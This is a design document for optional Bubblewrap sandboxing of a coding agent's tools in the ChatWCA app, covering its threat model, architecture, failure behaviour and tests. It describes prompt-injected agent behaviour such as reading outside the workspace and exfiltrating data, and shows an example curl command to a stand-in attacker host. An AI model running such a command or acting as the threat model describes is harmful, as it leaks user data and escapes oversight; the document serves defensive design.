# Optional Bubblewrap Workspace Sandboxing

**Status:** Design input

**Platform:** Linux

## Summary

Add an optional, server-enforced workspace security profile that confines Pi tool execution with Bubblewrap. The primary purpose is to reduce the blast radius of prompt injection or unintended agent behavior while retaining useful coding capabilities inside the selected workspace.

The sandbox must cover every enabled filesystem and process tool, not only `bash`. A bash-only wrapper is useful defense in depth, but it is not a workspace sandbox because Pi's `read`, `write`, and `edit` tools otherwise access the host filesystem directly from the ChatWCA process.

The initial sandbox profile should provide workspace read/write access, deny tool-process network access, expose only explicit read-only system/toolchain paths, use an ephemeral home and temporary directory, sanitize the environment, and hide ChatWCA/Pi state. It must fail closed when unavailable.

## Deployment security context

ChatWCA is deployed behind a reverse proxy that requires mutual TLS. This materially reduces the risk of an unauthenticated browser operating ChatWCA, provided that clients cannot bypass the proxy.

Deployment must therefore ensure that:

- ChatWCA binds to `127.0.0.1` when the proxy runs on the same host, or a host firewall permits backend access only from the proxy server;
- port `8787` is not otherwise reachable;
- the proxy preserves the browser-facing `Host` header and supports WebSocket upgrades; and
- every accepted client certificate is treated as having full ChatWCA access, because ChatWCA has no internal authorization model.

Bubblewrap does not replace mTLS, firewalling, or reverse-proxy controls. It addresses a different threat: a trusted user's agent being manipulated or making an unsafe tool call.

## Threat model

The sandbox should assume that the model may:

- follow malicious instructions found in repository content;
- attempt to read or modify paths outside the selected workspace;
- execute arbitrary shell commands;
- try to send workspace or host data to an external destination; or
- leave child processes running after a command is aborted.

The sandbox should protect:

- host credentials and files outside the workspace;
- unrelated repositories and user configuration;
- ChatWCA's SQLite database;
- Pi credentials, configuration, and session history;
- workspace-local `.chatwca/sessions`; and
- the host network from direct access by sandboxed tool processes.

The following remain outside the protection offered by Bubblewrap:

- malicious or incorrect changes within the writable workspace;
- backdoors added to source code, tests, dependencies, or build scripts;
- disclosure of workspace content to the configured model provider;
- disclosure in an assistant response to an authenticated ChatWCA client;
- arbitrary code executed by extensions or tools left in the parent server process; and
- CPU, memory, disk, or process exhaustion unless separate resource controls are added.

Bubblewrap provides mount and namespace isolation. It does not by itself provide cgroup quotas or a default application-specific seccomp policy.

## Data-exfiltration properties

A sandbox with an isolated network namespace can prevent direct tool-process exfiltration such as:

```text
curl attacker.example --data-binary @file
git push
npm publish
```

It does not make workspace data confidential from the configured model provider. The normal coding-agent path remains:

```text
workspace -> read/tool result -> ChatWCA parent -> model provider
```

The model provider necessarily receives workspace content that is placed in model context. A prompt injection may also cause content to appear in an assistant response visible to an authenticated client.

The intended security property is therefore narrower:

> A compromised agent may operate within the permitted workspace and send required context to the configured model provider, but its local tool processes cannot directly contact an additional arbitrary destination or read unrelated host data.

If workspace content must not leave the host at all, the deployment must use a trusted local model or add separate content-control/DLP mechanisms. Bubblewrap cannot enforce that requirement around a remote provider call made by the parent ChatWCA process.

## Why a bash-only wrapper is insufficient

Pi's default coding tools include `read`, `bash`, `edit`, and `write`. Filesystem tools resolve relative, absolute, and parent-traversal paths and normally perform I/O in the ChatWCA Node.js process. Sandboxing only shell children would leave those direct paths unrestricted.

Other possible bypasses include:

- `grep`, `find`, `ls`, or future built-in tools not routed through the sandbox;
- custom tools registered by extensions;
- extension event handlers calling Node filesystem/process/network APIs; and
- extension commands or provider hooks executing in the parent process.

Pi includes a sandbox extension example using `@anthropic-ai/sandbox-runtime`, but it should not be adopted directly as the ChatWCA boundary. The example wraps `bash`, uses process-global sandbox manager state, and is not designed for concurrently active workspaces with different policies.

## Recommended architecture

Keep model execution, provider credentials, session persistence, and WebSocket handling in the existing ChatWCA process. Route all enabled coding-tool operations through an app-owned sandbox worker:

```text
Browser via mTLS proxy
          |
          v
ChatWCA / Pi session in parent process
  - model/provider network
  - Pi credentials and sessions
  - workspace policy lookup
          |
          | private stdio IPC
          v
Per-conversation Bubblewrap worker
  - no provider credentials
  - no ChatWCA database
  - no Pi session store
  - workspace mounted read/write
  - network denied
  - sanitized environment
          |
          v
Commands and filesystem operations
```

A persistent worker per live conversation is the preferred design candidate because it:

- provides one consistent mount namespace and ephemeral home for a runtime;
- maps naturally to the existing conversation runtime lifecycle and limit;
- allows every tool operation to cross the same enforcement boundary;
- supports streaming command output and abort propagation; and
- keeps provider networking in the parent while tool networking is denied.

A per-operation Bubblewrap invocation is a simpler alternative, but it has more setup overhead and makes consistent temporary state, process cleanup, and atomic multi-step file operations harder.

The worker protocol should be narrow and typed. It should support only the operations needed by the app-owned tool definitions, including command execution, reads, writes, directory creation/listing, metadata checks, and cancellation. Command stdout/stderr must not be allowed to corrupt the worker's IPC framing.

## Pi SDK integration

The pinned Pi SDK exposes pluggable operations for the relevant built-in tools, including:

- `BashOperations`;
- `ReadOperations`;
- `WriteOperations`;
- `EditOperations`;
- `LsOperations`;
- `GrepOperations`; and
- `FindOperations`.

ChatWCA should construct an explicit app-owned tool set for a sandboxed runtime and route those operations to the worker. Any tool whose complete implementation cannot be brokered must be disabled until a sandboxed implementation exists.

The runtime factory currently supports CWD-bound service and session options. Downstream design should pass the resolved workspace security profile explicitly into runtime creation rather than infer policy only from a CWD lookup.

A strict sandbox profile should disable arbitrary Pi extensions because extensions execute inside the parent server process with full host permissions. This may affect model providers or other capabilities supplied by extensions. A future design may support a server-administrator allowlist of trusted global extensions, but project-controlled extension code must not silently bypass a workspace sandbox.

Skills, context files, and prompt templates may remain available as model input. They are treated as potentially untrusted instructions whose consequences the sandbox is intended to contain.

## Initial security profiles

Use an extensible profile field rather than a boolean:

```ts
securityProfile: "unrestricted" | "workspace-sandboxed"
```

### `unrestricted`

Preserves current ChatWCA and Pi behavior.

### `workspace-sandboxed`

Initial target behavior:

- mount the canonical workspace read/write;
- hide or mask `<workspace>/.chatwca`, especially local sessions;
- do not mount the ChatWCA data directory or Pi agent directory;
- construct a minimal filesystem root rather than bind the entire host root read-only;
- expose required system binaries and libraries read-only;
- support explicit administrator-configured read-only toolchain mounts;
- provide minimal `/proc` and `/dev` views;
- use ephemeral `$HOME`, `/tmp`, and `/var/tmp`;
- isolate network, PID, IPC, and UTS namespaces where supported;
- drop capabilities and prevent privilege gain;
- pass only an allowlisted environment;
- omit provider keys, cloud credentials, SSH agent sockets, proxy credentials, and Pi session variables;
- track and terminate the worker and all descendants on abort, close, eviction, or shutdown; and
- disable unapproved extensions and tools.

The profile should initially deny all network access. Domain allowlisting is deferred because it requires a managed proxy and creates obvious exfiltration channels through otherwise legitimate destinations such as GitHub or package registries.

Whether `.git` is writable remains a design decision. Making it read-only prevents staging, commits, hook/config persistence, and some repository corruption, but also breaks common coding workflows. Even with `.git` protected, writable source and build scripts can provide delayed execution when a human later runs them outside the sandbox.

## Workspace policy and persistence

Persist the security profile with the workspace definition in SQLite. Existing workspaces should migrate to `unrestricted` to preserve behavior. New sandboxing may begin as opt-in while compatibility is evaluated.

Profile changes should:

- be rejected while the workspace owns any live runtime;
- require explicit confirmation when reducing protection;
- take effect when a conversation is next created or opened; and
- apply to forks and rewinds through the destination workspace policy.

The profile belongs to the workspace, not the Pi JSONL session. Reopening an old session should use the workspace's current profile. Workspace Info and the conversation header should clearly display the effective profile.

## Server-enforced policy ceiling

A browser-selectable profile is a usability preference, not an administrator security boundary. Downstream design should include server configuration that limits what the UI may select. Candidate settings are:

```text
CHATWCA_SANDBOX_MODE=disabled|optional|required
CHATWCA_WORKSPACE_ROOTS=/srv/projects,/home/operator/projects
CHATWCA_BWRAP_PATH=/usr/bin/bwrap
```

Possible semantics:

- `disabled`: sandbox profiles cannot be selected;
- `optional`: workspaces may choose `unrestricted` or `workspace-sandboxed`;
- `required`: every usable workspace is sandboxed and the UI cannot downgrade it; and
- `CHATWCA_WORKSPACE_ROOTS`: workspace registration is limited to canonical descendants of administrator-approved roots.

The exact names and configuration format are design decisions. The important property is that browser commands cannot exceed the server administrator's capability ceiling.

## Failure behavior

Sandboxing must fail closed. ChatWCA must not silently fall back to unrestricted tools when:

- Bubblewrap is absent;
- the configured executable is invalid or insecure;
- required namespaces are unavailable;
- a mount or worker startup fails;
- the worker IPC handshake fails; or
- a required tool cannot be brokered.

Startup should validate configuration, and opening or creating a sandboxed conversation should run or rely on a functional Bubblewrap probe. Errors should use a stable public code and provide actionable private diagnostics in server logs.

The deployment currently has `/usr/bin/bwrap` version `0.6.1`, but availability on this host is not a substitute for runtime capability checks or documented installation requirements.

## Compatibility considerations

A strict synthetic root will intentionally break tools installed in unmounted user directories, language-version managers, global package caches, local services, Docker sockets, and commands requiring network access. The UI and documentation must make these restrictions clear.

Administrator-configured read-only toolchain paths can improve compatibility, but every added path expands readable data. Binding the whole host filesystem read-only is not an acceptable confidentiality boundary because read-only secrets remain readable.

Workspace-local dependencies remain available because the workspace itself is mounted. Package installation that requires network access will fail under the initial profile. A later network-enabled profile should be considered separately rather than weakening the first profile.

## Resource controls

Bubblewrap namespace isolation does not prevent fork bombs, CPU exhaustion, memory exhaustion, or filling writable storage. Downstream design should evaluate:

- process-count limits;
- memory and CPU limits through cgroups/systemd;
- command timeouts;
- output limits already enforced by Pi/ChatWCA;
- temporary-directory size limits; and
- cleanup of abandoned workers and namespaces.

These controls may be a separate hardening phase, but the sandbox UI must not imply that Bubblewrap solves denial of service.

## Testing requirements

At minimum, automated Linux integration tests should verify that a sandboxed runtime:

- can read, edit, write, and execute within its workspace;
- cannot read or write an unrelated temporary directory;
- cannot escape through `..`, absolute paths, or symlinks;
- cannot access the ChatWCA database, Pi agent directory, or global session store;
- cannot access workspace-local `.chatwca/sessions`;
- cannot read provider credentials from environment variables or `/proc`;
- cannot make IPv4, IPv6, DNS, or loopback network connections;
- cannot use an unbrokered built-in or extension tool;
- continues to use the remote model through the parent process;
- terminates command descendants on abort and runtime disposal;
- fails closed when Bubblewrap or a required namespace is unavailable; and
- supports concurrent unrestricted and sandboxed workspaces without policy leakage.

Tests should also cover workspace profile migration, updates with live runtimes, fork/rewind inheritance, LRU eviction, graceful shutdown, worker crashes, malformed IPC, output backpressure, and operation under the provided systemd service.

## Open design questions

1. Should the worker be persistent per conversation, shared per workspace, or created per operation?
2. Which system and toolchain paths are included in the default synthetic root?
3. Is `.git` writable, read-only, or controlled by a separate capability?
4. Are any trusted global extensions allowed in a sandboxed workspace, and how are they identified before executing their code?
5. Which of `grep`, `find`, and `ls` are supported in the first release?
6. How should worker IPC support streaming, cancellation, large writes, and binary image reads?
7. Which cgroup or rlimit controls belong in the first release?
8. Should new workspaces default to sandboxed after the feature leaves experimental status?
9. Is workspace-root allowlisting required whenever sandbox mode is `required`?
10. How should the UI explain that workspace content still reaches a configured remote model provider?

## Candidate acceptance criteria

The feature is ready when:

- a workspace can persist and display an effective security profile;
- the server can require sandboxing regardless of browser preference;
- all tools enabled in a sandboxed runtime execute through the intended boundary;
- no arbitrary extension code executes as part of a strict sandboxed runtime;
- tool processes have no network and receive no server/provider credentials;
- only the workspace and explicit read-only runtime paths are mounted;
- ChatWCA and Pi persistence remain outside the sandbox;
- sandbox setup and runtime failures never fall back to unrestricted execution;
- abort, close, eviction, and shutdown reliably remove sandbox workers and descendants;
- concurrent workspaces retain independent policies; and
- documentation states both the protection provided and the residual workspace/model-provider risks.
